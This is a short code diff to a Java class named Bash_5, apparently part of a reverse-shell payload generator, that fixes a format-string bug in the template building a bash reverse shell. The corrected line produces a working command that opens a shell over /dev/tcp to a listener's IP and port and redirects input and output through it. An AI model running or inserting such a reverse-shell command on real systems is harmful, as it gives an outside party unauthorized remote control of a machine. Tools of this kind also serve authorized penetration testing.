@@ -9,7 +9,7 @@ public class Bash_5  extends Reverse{
 
     public Bash_5(String localIP, int localPort, LISTENER listener, SHELLS shellType){
         super(localIP, localPort, listener, shellType);
-        shellFormat = String.format("%s -i 5<> /dev/tcp/%s/% 0<&5 1>&5 2>&5", this.getShell(), this.getLocalIP(), this.getLocalPort());
+        shellFormat = String.format("%s -i 5<> /dev/tcp/%s/%s 0<&5 1>&5 2>&5", this.getShell(), this.getLocalIP(), this.getLocalPort());
     }
 
     @Override
